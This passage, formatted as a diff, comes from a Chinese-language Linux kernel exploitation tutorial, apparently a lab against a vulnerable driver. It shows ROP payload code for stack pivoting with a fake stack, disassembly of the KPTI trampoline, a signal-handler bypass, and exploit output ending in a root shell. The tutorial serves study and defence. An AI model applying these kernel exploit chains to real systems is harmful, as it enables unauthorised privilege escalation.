@@ -1,0 +1,140 @@
+        fake_stack[offset++] = swapgs_pop1_ret;     // swapgs ; pop rbp ; ret   
+        fake_stack[offset++] = 0x0;             // 
+        fake_stack[offset++] = iretq;               // iretq        
+        fake_stack[offset++] = user_rip;
+        fake_stack[offset++] = user_cs;
+        fake_stack[offset++] = user_rflags;
+        fake_stack[offset++] = user_sp;
+        fake_stack[offset++] = user_ss;
+        unsigned long payload[60];
+        unsigned long off = 0x80/8;
+        payload[off++] = cookie;
+        payload[off++] = 0x0;
+        payload[off++] = 0x0;
+        payload[off++] = 0x0;                   // only overwrite return address
+        payload[off++] = 0xffffffff8196f56a;    // mov esp, 0x5b000000 ; pop r12 ; pop rbp ; ret
+        puts("[*] Prepared payload");
+        size_t size = write(global_fd, payload, sizeof(payload));
+        puts("[!] Should never be reached");
+    }
+构造fake_stack时需要注意的几点
+  * mmap两个pages，从`0x5b000000 - 0x1000`开始而不是`0x5b000000`，这是因为在fake_stack里执行的函数会导致栈生长，如果`esp`指向page的起始地址，可能导致fake_stack栈空间不足，异常结束。
+  * 第一个空白页，我们需要写入一个dirty值，否则导致`Double Fault`，
+        [   44.010031] traps: PANIC: double fault, error_code: 0x0
+    [   44.010827] double fault: 0000 [#1] SMP NOPTI
+这是由于page在mapped之后并不会立即插入page
+table，而是在被写入之后。所以尽管ROPchain在第二个page，第一个page也需要一次写入。
+#### ByPass KPTI
+##### Page Table
+每一个进程都有一个指向进程自身的页表，由CR3寄存器指定。
+##### KPTI
+Kernel Page-table isolation，该机制引入kernel防止`meltdown`攻击，在userland没有类似的机制。
+如果没有KPTI，从kernel-mode切换到user-mode时，Linux会在其页表中保存整个内核内存的映射，这样做的优点是当应用程序向内核发送系统调用或者接收到中断时，内核页表始终存在，可以避免大多数上下文切换的开销。
+开启KPTI后，userland页表只有部分内核映射（用于中断入口出口），而避免了内核页表的泄漏。
+##### bypass
+在开启KPTI的情况下，目前为止得到所有exploit都将造成`crash`，有趣的是该crash是在userland常见的`Segmentation
+fault`。
+    / $ ./exploit 
+    [*] Saved state
+    [*] Opened device
+    [*] Leak 160 bytes
+    [*] Cookie: 0x6e0d7bffd02b0400
+    [*] Prepared payload
+    Segmentation fault
+这是由于尽管回到了user-mode，page-tables依然是kernel-mode的（并没有主动交换页表），在`kernel-mode`下userland的pages是不可执行的。
+绕过KPTI的两种常见方法：
+  * 使用`signal handler`：这种方法很简单，机智。原理这个崩溃导致userland处理`SIGSEGV`信号，我们可以为它注册一个信号处理句柄，只需要在main函数中加上以下简单的语句
+        signal(SIGSEGV, get_root_shell);
+疑惑地是，即使作为`handler`，`get_root_shell`函数依然是在不可执行的页面上。
+  * KPTI trampoline：基于的理论是“如果一个syscall正常返回，那么内核中一定有一段代码会将page tables交换回userland，因此我们可以利用这段代码达到目的。这段代码称为`KPTI trampoline`，它的作用就是交换page tables, `swapgs`和`iretq`。
+这段代码所在的函数是`swapgs_restore_regs_and_return_to_usermode()`，在`/proc/kallsyms`中一样可以找到其地址。
+        / # cat /proc/kallsyms | grep swapgs_restore_regs_and_return_to_usermode
+    ffffffff81200f10 T swapgs_restore_regs_and_return_to_usermode
+该函数的起始部分代码
+        .text:FFFFFFFF81200F10                 pop     r15
+    .text:FFFFFFFF81200F12                 pop     r14
+    .text:FFFFFFFF81200F14                 pop     r13
+    .text:FFFFFFFF81200F16                 pop     r12
+    .text:FFFFFFFF81200F18                 pop     rbp
+    .text:FFFFFFFF81200F19                 pop     rbx
+    .text:FFFFFFFF81200F1A                 pop     r11
+    .text:FFFFFFFF81200F1C                 pop     r10
+    .text:FFFFFFFF81200F1E                 pop     r9
+    .text:FFFFFFFF81200F20                 pop     r8
+    .text:FFFFFFFF81200F22                 pop     rax
+    .text:FFFFFFFF81200F23                 pop     rcx
+    .text:FFFFFFFF81200F24                 pop     rdx
+    .text:FFFFFFFF81200F25                 pop     rsi
+    .text:FFFFFFFF81200F26                 mov     rdi, rsp
+    .text:FFFFFFFF81200F29                 mov     rsp, qword ptr gs:unk_6004
+    .text:FFFFFFFF81200F32                 push    qword ptr [rdi+30h]
+    .text:FFFFFFFF81200F35                 push    qword ptr [rdi+28h]
+    .text:FFFFFFFF81200F38                 push    qword ptr [rdi+20h]
+    .text:FFFFFFFF81200F3B                 push    qword ptr [rdi+18h]
+    .text:FFFFFFFF81200F3E                 push    qword ptr [rdi+10h]
+    .text:FFFFFFFF81200F41                 push    qword ptr [rdi]
+    .text:FFFFFFFF81200F43                 push    rax
+    .text:FFFFFFFF81200F44                 jmp     short loc_FFFFFFFF81200F89
+通过`pop`从栈上恢复大量寄存器，这一部分会增加ROPchain的负载，因此我们这里的`kpti_trampoline`只从`pop`之后的第一条指令的位置，即`func+22`位置。
+该函数里最关键的代码
+    .text:FFFFFFFF81200F89 loc_FFFFFFFF81200F89:                   ; CODE XREF: sub_FFFFFFFF812010D0-18C↑j
+      .text:FFFFFFFF81200F89                 pop     rax
+      .text:FFFFFFFF81200F8A                 pop     rdi
+      .text:FFFFFFFF81200F8B                 call    cs:off_FFFFFFFF82040088
+      .text:FFFFFFFF81200F91                 jmp     cs:off_FFFFFFFF82040080
+      .....
+      .data:FFFFFFFF82040088 off_FFFFFFFF82040088 dq offset sub_FFFFFFFF8146D4E0
+      .data:FFFFFFFF82040080 off_FFFFFFFF82040080 dq offset sub_FFFFFFFF81200FC0
+      .....
+      .text.native_swapgs:FFFFFFFF8146D4E0 sub_FFFFFFFF8146D4E0 proc near          ; CODE XREF: sub_FFFFFFFF8100A540+E↑p
+      .text.native_swapgs:FFFFFFFF8146D4E0                                         ; sub_FFFFFFFF8100A570+17↑p ...
+      .text.native_swapgs:FFFFFFFF8146D4E0                 push    rbp
+      .text.native_swapgs:FFFFFFFF8146D4E1                 mov     rbp, rsp
+      .text.native_swapgs:FFFFFFFF8146D4E4                 swapgs
+      .text.native_swapgs:FFFFFFFF8146D4E7                 pop     rbp
+      .text.native_swapgs:FFFFFFFF8146D4E8                 retn
+      .text.native_swapgs:FFFFFFFF8146D4E8 sub_FFFFFFFF8146D4E0 endp
+      ...
+      .text:FFFFFFFF81200FC0                 test    byte ptr [rsp+arg_18], 4
+      .....
+      .text:FFFFFFFF8120102E                 mov     rdi, cr3
+      .text:FFFFFFFF81201031                 jmp     short loc_FFFFFFFF81201067
+      .text:FFFFFFFF81201033 ; ------------------------------------------------------      .text:FFFFFFFF81201067 loc_FFFFFFFF81201067:                   ; CODE XREF: sub_FFFFFFFF81200FC0+71↑j
+      .text:FFFFFFFF81201067                 or      rdi, 1000h
+      .text:FFFFFFFF8120106E                 mov     cr3, rdi
+      ....
+      .text:FFFFFFFF81200FC7                 iretq
+`swapgs`用于切换kernel-mode和user-mode的GS寄存器
+`mov rdi, cr3; or rdi, 0x1000; mov cr3, rdi;`代码段用于切换CR3寄存器。
+`iretq`切换到user-mode。
+因此，利用该函数的代码片段即可以完成`swapgs; swap page tables; iretq`等操作，构造的`payload`如下
+    ...
+        payload[offset++] = commit_creds;
+        payload[offset++] = kpti_trampoline; 
+        payload[offset++] = 0x0;
+        payload[offset++] = 0x0;
+        payload[offset++] = user_rip;
+        payload[offset++] = user_cs;
+        payload[offset++] = user_rflags;
+        payload[offset++] = user_sp;
+        payload[offset++] = user_ss;
+        ....
+也可以利用gadget执行交换page tables的操作，有同样的效果，这是这个函数内集成了多个gadget序列，比较便利。
+这种方式可以绕过KPTI策略。
+    / $ ./exploit 
+      [*] Saved state
+      [*] Opened device
+      [*] Leak 160 bytes
+      [*] Cookie: 0x14324065f2932600
+      [*] Prepared payload
+      [*] Returned to userland
+      [*] UID: 0, got root priv
+      / # id
+      uid=0 gid=0
+#### Bypass SMAP
+同SMEP类似，当进程在kernel-mode下时，userspace的地址空间标记为不可读、不可写。
+显然，通过ROPchain的方式绕过SMEP的策略也适用于绕过SMAP（结合绕过KPTI的策略）
+参考
+[WIKI-内核页表隔离](https://zh.wikipedia.org/wiki/%E5%86%85%E6%A0%B8%E9%A1%B5%E8%A1%A8%E9%9A%94%E7%A6%BB)
+[2021: "Learning Linux Kernel
+Exploitation"](https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/) [article] [[part 2](https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/)] [[part 3](https://lkmidas.github.io/posts/20210205-linux-kernel-pwn-part-3/)]
